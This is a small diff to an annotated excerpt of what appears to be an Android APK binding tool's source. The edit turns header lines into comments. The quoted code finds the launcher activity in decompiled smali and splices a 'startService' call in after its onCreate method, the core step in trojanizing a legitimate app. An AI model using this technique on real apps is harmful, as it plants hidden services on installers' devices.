@@ -1,5 +1,5 @@
-Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
-================================================ | =============================== |
+// Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
+// ================================================ | =============================== |
 function GetLauncherPath(manifest, smaliPath) {
 
 
@@ -62,14 +62,14 @@ function GetLauncherPath(manifest, smaliPath) {
 
   
 
-OrgAppKey2 | Constants.js = Line 32 |
-========== | ====================== |
+// OrgAppKey2 | Constants.js = Line 32 |
+// ========== | ====================== |
 exports.orgAppKey2 = ';->onCreate()V';
 
 
 
-OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
-======================== | =============================== |
+// OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
+// ======================== | =============================== |
 var key = CONSTANTS.orgAppKey2;
 $appCtrl.Log("Modifiying launcher activity...");
 var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
